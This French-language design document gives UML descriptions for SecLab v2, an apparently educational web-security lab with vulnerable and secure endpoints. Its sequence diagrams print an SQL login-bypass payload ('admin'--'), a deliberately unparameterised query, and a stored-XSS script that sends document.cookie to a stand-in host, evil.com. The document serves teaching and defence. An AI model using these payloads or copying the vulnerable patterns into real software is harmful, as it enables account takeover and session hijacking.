# DESCRIPTIONS UML — SecLab v2
## Descriptions précises pour reproduction dans StarUML ou draw.io

---

## 1. DIAGRAMME DE CAS D'UTILISATION (Use Case Diagram)

### 1.1 Acteurs

**Acteur 1 : Étudiant / Apprenant**
- Rôle principal de la plateforme
- Peut se connecter, naviguer entre les laboratoires, soumettre des payloads

**Acteur 2 : Administrateur**
- Hérite de tous les droits de l'Étudiant
- Accès supplémentaire aux fonctions d'administration

**Acteur 3 : Attaquant Simulé** *(acteur secondaire, représente les actions malveillantes)*
- Symbolise les tentatives d'attaque via les endpoints vulnérables

**Acteur 4 : Système de Détection** *(acteur secondaire / système)*
- Représente le middleware `attackDetector.js`
- Intervient automatiquement sur toutes les requêtes

### 1.2 Cas d'Utilisation

**UC1 : Se connecter**
- Acteur principal : Étudiant
- Pré-condition : Aucune session active
- Description : Saisie des credentials, validation JWT, redirection vers Dashboard

**UC2 : Se déconnecter**
- Acteur principal : Étudiant
- Inclut (<<include>>) : UC10 Invalider le token JWT

**UC3 : Consulter le Dashboard**
- Acteur principal : Étudiant
- Inclut (<<include>>) : UC11 Récupérer les statistiques

**UC4 : Tester l'injection SQL**
- Acteur principal : Étudiant / Attaquant Simulé
- Inclut (<<include>>) : UC12 Détecter l'attaque
- Étend (<<extend>>) : UC4a Soumettre un payload vulnérable, UC4b Soumettre un payload sécurisé
- Pré-condition : Être authentifié

**UC5 : Tester le XSS**
- Acteur principal : Étudiant / Attaquant Simulé
- Inclut (<<include>>) : UC12 Détecter l'attaque
- Sous-cas : UC5a XSS Réfléchi, UC5b XSS Stocké
- Pré-condition : Être authentifié

**UC6 : Tester le CSRF**
- Acteur principal : Étudiant / Attaquant Simulé
- Inclut (<<include>>) : UC12 Détecter l'attaque
- Étend (<<extend>>) : UC6a Obtenir un token CSRF (mode sécurisé)
- Pré-condition : Être authentifié

**UC7 : Tester le Brute Force**
- Acteur principal : Étudiant / Attaquant Simulé
- Inclut (<<include>>) : UC12 Détecter l'attaque
- Étend (<<extend>>) : UC7a Déclencher le verrouillage de compte
- Pré-condition : Être authentifié

**UC8 : Tester le Path Traversal**
- Acteur principal : Étudiant / Attaquant Simulé
- Inclut (<<include>>) : UC12 Détecter l'attaque
- Pré-condition : Être authentifié

**UC9 : Consulter les Journaux d'Attaques**
- Acteur principal : Étudiant
- Inclut (<<include>>) : UC13 Filtrer les logs, UC14 Exporter CSV
- Pré-condition : Être authentifié

**UC10 : Gérer les Utilisateurs** *(admin uniquement)*
- Acteur principal : Administrateur
- Pré-condition : Être authentifié avec le rôle admin

**UC11 : Modifier son Profil**
- Acteur principal : Étudiant
- Inclut (<<include>>) : UC15 Changer le mot de passe

**UC12 : Détecter l'attaque** *(cas système, inclus par tous les cas de test)*
- Acteur principal : Système de Détection
- Post-condition : Événement persisté dans attack_logs avec sévérité et points

**UC13 : Recevoir une notification critique**
- Acteur principal : Étudiant
- Déclencheur : Nouvelle attaque CRITICAL (polling 10s)

### 1.3 Relations Principales

- UC2 <<include>> UC10 (logout invalide le token)
- UC3 <<include>> UC11 (dashboard nécessite les stats)
- UC4, UC5, UC6, UC7, UC8 <<include>> UC12 (toute attaque est détectée)
- UC9 <<extend>> UC14 (export CSV optionnel depuis les logs)
- UC10 <<extend>> UC4 (admin peut aussi utiliser les labs)

---

## 2. DIAGRAMME DE CLASSES (Class Diagram)

### 2.1 Classes

**Classe : User**
```
User
─────────────────────────────
+ id : Integer
+ username : String
+ password : String (bcrypt hash)
+ email : String
+ role : Enum {admin, user, moderator}
+ created_at : DateTime
+ last_login : DateTime
─────────────────────────────
+ authenticate(password) : Boolean
+ generateToken() : String
+ generateRefreshToken() : String
+ changePassword(newPassword) : void
```

**Classe : AttackLog**
```
AttackLog
─────────────────────────────
+ id : Integer
+ attack_type : Enum {SQL_INJECTION, XSS, CSRF, BRUTE_FORCE, PATH_TRAVERSAL, OTHER}
+ payload : String
+ endpoint : String
+ ip_address : String
+ user_agent : String
+ status : Enum {DETECTED, BLOCKED, PASSED}
+ severity : Enum {LOW, MEDIUM, HIGH, CRITICAL}
+ points : Integer
+ created_at : DateTime
─────────────────────────────
+ getSeverityPoints() : Integer
+ sanitizePayload() : String
```

**Classe : AttackDetector** *(Middleware)*
```
AttackDetector
─────────────────────────────
- SQLI_PATTERNS : RegExp[]
- XSS_PATTERNS : RegExp[]
- PATH_PATTERNS : RegExp[]
- SEVERITY_POINTS : Map<String, Integer>
─────────────────────────────
+ detectAttack(input: String) : {detected: Boolean, type: String}
+ getSeverity(payload: String, type: String) : String
+ sanitizeForLog(payload: String) : String
+ logAttackToDB(data: Object) : Promise<void>
+ middleware(req, res, next) : void
```

**Classe : AuthService**
```
AuthService
─────────────────────────────
- JWT_SECRET : String
- tokenBlacklist : Set<String>
- refreshTokenStore : Map<String, Object>
─────────────────────────────
+ generateToken(user: User) : String
+ generateRefreshToken(user: User) : String
+ consumeRefreshToken(token: String) : {user: User}
+ blacklistToken(token: String) : void
+ isBlacklisted(jti: String) : Boolean
+ requireAuth(req, res, next) : void
+ requireRole(...roles: String[]) : Middleware
```

**Classe : CsrfService**
```
CsrfService
─────────────────────────────
- csrfTokenStore : Map<String, {token, expiresAt}>
- accountBalances : Map<Integer, Number>
─────────────────────────────
+ generateCsrfToken(userId: Integer) : String
+ validateCsrfToken(userId: Integer, token: String) : Boolean
+ getBalance(userId: Integer) : Number
+ setBalance(userId: Integer, amount: Number) : void
```

**Classe : BruteForceService**
```
BruteForceService
─────────────────────────────
- loginAttempts : Map<String, {attempts, lastAttempt, lockedUntil}>
- MAX_ATTEMPTS : Integer = 5
- LOCKOUT_PERIOD : Integer = 180000 (ms)
─────────────────────────────
+ getAttemptData(username: String) : Object
+ recordFailedAttempt(username: String) : Object
+ resetAttempts(username: String) : void
+ isLocked(username: String) : {locked: Boolean, remainingSeconds: Integer}
```

**Classe : Product**
```
Product
─────────────────────────────
+ id : Integer
+ name : String
+ category : String
+ price : Decimal
+ description : String
+ stock : Integer
+ is_secret : Boolean
─────────────────────────────
(Pas de méthodes — entité pure)
```

**Classe : Comment**
```
Comment
─────────────────────────────
+ id : Integer
+ author : String
+ content : String
+ endpoint_type : Enum {vulnerable, secure}
+ created_at : DateTime
─────────────────────────────
(Pas de méthodes — entité pure)
```

**Classe : AuditTrail**
```
AuditTrail
─────────────────────────────
+ id : Integer
+ user_id : Integer (FK → User)
+ action : String
+ target : String
+ ip : String
+ created_at : DateTime
─────────────────────────────
(Pas de méthodes — entité pure)
```

### 2.2 Relations

- `User` (1) ──── (0..*) `AttackLog` : génère (via l'IP ou le compte)
- `User` (1) ──── (0..*) `AuditTrail` : produit
- `AttackDetector` ──── utilise ──── `AttackLog` : persiste
- `AuthService` ──── gère ──── `User` : authentifie
- `CsrfService` ──── dépend de ──── `User` (par userId)
- `BruteForceService` ──── surveille ──── `User` (par username)

---

## 3. DIAGRAMMES DE SÉQUENCE

### 3.1 Séquence 1 : Attaque SQLi Réussie (Endpoint Vulnérable)

**Participants (de gauche à droite) :**
- `Attaquant` (acteur)
- `Browser/Frontend` (React)
- `AttackDetector` (middleware Express)
- `AuthRoute (vulnérable)` (Express router)
- `MySQL` (base de données)

**Séquence :**
```
1. Attaquant → Browser : saisit payload "admin'--" dans le formulaire login
2. Browser → AttackDetector : POST /api/auth/login-vulnerable {username: "admin'--"}
3. AttackDetector → AttackDetector : detectAttack("admin'--") → {detected: true, type: "SQL_INJECTION"}
4. AttackDetector → MySQL : INSERT INTO attack_logs (type: SQL_INJECTION, severity: HIGH, status: DETECTED)
5. AttackDetector → AuthRoute : next() [requête transmise]
6. AuthRoute → AuthRoute : construit sql = "SELECT * FROM users WHERE username='admin'--' AND password='x'"
7. AuthRoute → MySQL : pool.query(sql) [REQUÊTE NON PARAMÉTRÉE]
8. MySQL → MySQL : exécute SQL (le '--' commente la condition password)
9. MySQL → AuthRoute : rows[0] = {id:1, username:'admin', role:'admin'} [admin trouvé sans mdp!]
10. AuthRoute → AuthRoute : generateToken(admin)
11. AuthRoute → Browser : HTTP 200 {success: true, token: JWT, query_used: sql_exposé}
12. Browser → Attaquant : affiche "AUTHENTIFICATION CONTOURNÉE" + JWT valide
```

### 3.2 Séquence 2 : Attaque SQLi Bloquée (Endpoint Sécurisé)

**Participants :**
- `Attaquant` (acteur)
- `Browser/Frontend` (React)
- `Validator` (express-validator)
- `AttackDetector` (middleware)
- `AuthRoute (sécurisé)` (Express router)
- `MySQL` (base de données)

**Séquence :**
```
1. Attaquant → Browser : saisit payload "admin'--"
2. Browser → Validator : POST /api/auth/login-secure {username: "admin'--", password: "x"}
3. Validator → Validator : body('username').trim().notEmpty() → valide
4. Validator → AttackDetector : next()
5. AttackDetector → MySQL : INSERT INTO attack_logs (DETECTED, HIGH) [journalisé mais non bloqué]
6. AttackDetector → AuthRoute : next()
7. AuthRoute → MySQL : pool.query("SELECT * WHERE username = ?", ["admin'--"]) [PARAMÉTRÉ]
8. MySQL → MySQL : cherche l'utilisateur avec username = "admin'--" littéralement
9. MySQL → AuthRoute : rows[] = [] [aucun utilisateur nommé "admin'--"]
10. AuthRoute → Browser : HTTP 401 {error: "Invalid credentials"}
11. Browser → Attaquant : affiche "❌ Identifiants incorrects"
   Note: Le payload est traité comme donnée, jamais exécuté comme SQL
```

### 3.3 Séquence 3 : XSS Stocké + Lecture par la Victime

**Participants :**
- `Attaquant` (acteur)
- `Browser Attaquant` (React)
- `XSSRoute (vulnérable)` (Express)
- `MySQL`
- `Browser Victime` (React, autre session)

**Séquence :**
```
=== Phase 1 : Injection du payload ===
1. Attaquant → Browser Attaquant : saisit payload "<script>new Image().src='http://evil.com?c='+document.cookie</script>"
2. Browser Attaquant → XSSRoute : POST /api/xss/comment-vulnerable {author: "Attaquant", content: "<script>..."}
3. XSSRoute → XSSRoute : detectXSS(content) → true (XSS détecté)
4. XSSRoute → MySQL : INSERT INTO attack_logs (XSS, CRITICAL, DETECTED)
5. XSSRoute → MySQL : INSERT INTO comments (author, content_raw_html, 'vulnerable') [SANS ENCODAGE]
6. MySQL → XSSRoute : insertId: 42
7. XSSRoute → Browser Attaquant : HTTP 201 {xss_detected: true, message: "⚠️ XSS payload stocké!"}
8. Browser Attaquant → Attaquant : Confirmation — payload en base de données

=== Phase 2 : Exécution chez la Victime ===
9. [Plus tard] Victime → Browser Victime : navigue vers la page XSS vulnérable
10. Browser Victime → XSSRoute : GET /api/xss/comments
11. XSSRoute → MySQL : SELECT * FROM comments WHERE endpoint_type = 'vulnerable'
12. MySQL → XSSRoute : [{id:42, author:'Attaquant', content:'<script>...', ...}]
13. XSSRoute → Browser Victime : HTTP 200 {comments: [{content:'<script>...'}]}
14. Browser Victime → Browser Victime : React render <div dangerouslySetInnerHTML={{__html: content}}>
15. Browser Victime → Browser Victime : DOM parse et EXÉCUTE le script JavaScript
16. Browser Victime → evil.com : GET http://evil.com?c=[COOKIE_DE_LA_VICTIME]
17. evil.com → Attaquant : Cookie reçu — session hijacking possible
```

---

## 4. DIAGRAMME DE DÉPLOIEMENT (Deployment Diagram)

### 4.1 Nœuds et Artefacts

**Nœud 1 : Machine Hôte (Host Machine)**
- Type : Ordinateur physique ou virtuel (Linux/Windows/macOS)
- Logiciel requis : Docker Engine ≥ 20.10, Docker Compose ≥ 2.0
- Ressources recommandées : 4 Go RAM, 10 Go disque

**Nœud 2 : Conteneur Docker `seclab-frontend`** *(déployé sur Nœud 1)*
- Image : `nginx:alpine` (multi-stage build)
- Artefacts déployés :
  - `/usr/share/nginx/html/` : Build React compilé (fichiers statiques)
  - `/etc/nginx/conf.d/default.conf` : Configuration Nginx (proxy + SPA fallback)
- Ports exposés : `80:80` (mapping hôte:conteneur)
- Dépendances : `seclab-backend` (via proxy)

**Nœud 3 : Conteneur Docker `seclab-backend`** *(déployé sur Nœud 1)*
- Image : `node:20-alpine`
- Artefacts déployés :
  - `/app/server.js` : Point d'entrée Express
  - `/app/routes/` : Routeurs (auth, sqli, xss, csrf, brute, files, logs, admin)
  - `/app/middleware/` : Middlewares (auth, security, attackDetector, logger)
  - `/app/config/db.js` : Pool de connexions MySQL
  - `/app/demo-files/` : Fichiers de démonstration Path Traversal
- Ports internes : `3001` (non exposé sur l'hôte)
- Variables d'environnement : `JWT_SECRET`, `MYSQL_*`, `NODE_ENV`, `CORS_ORIGIN`

**Nœud 4 : Conteneur Docker `seclab-mysql`** *(déployé sur Nœud 1)*
- Image : `mysql:8.0`
- Artefacts déployés :
  - `/docker-entrypoint-initdb.d/init.sql` : Script d'initialisation (schéma + seed)
- Volume nommé : `mysql_data` (persistance des données sur l'hôte)
- Ports internes : `3306` (non exposé sur l'hôte)
- Variables d'environnement : `MYSQL_ROOT_PASSWORD`, `MYSQL_DATABASE`, `MYSQL_USER`, `MYSQL_PASSWORD`

### 4.2 Réseau Docker

**Réseau : `seclab-net`**
- Driver : bridge
- Scope : Interne aux conteneurs (isolation réseau)
- Communication :
  - `seclab-frontend` ↔ `seclab-backend` : HTTP sur port 3001
  - `seclab-backend` ↔ `seclab-mysql` : TCP sur port 3306
  - `seclab-frontend` → Internet : Port 80 exposé sur l'hôte

### 4.3 Flux de Communication

```
[Navigateur Utilisateur :80]
         │
         │ HTTP/HTTPS :80
         ▼
[seclab-frontend : Nginx :80]
   - Fichiers statiques → servi directement
   - /api/* → proxy_pass vers seclab-backend:3001
         │
         │ HTTP :3001 (réseau seclab-net)
         ▼
[seclab-backend : Node.js :3001]
   - JWT auth + middlewares
   - Logique métier
         │
         │ MySQL protocol :3306 (réseau seclab-net)
         ▼
[seclab-mysql : MySQL :3306]
   - Volume mysql_data monté
```

---

*Ces descriptions sont conçues pour être reproduites fidèlement dans StarUML, draw.io, PlantUML ou tout autre outil UML sans ambiguïté.*
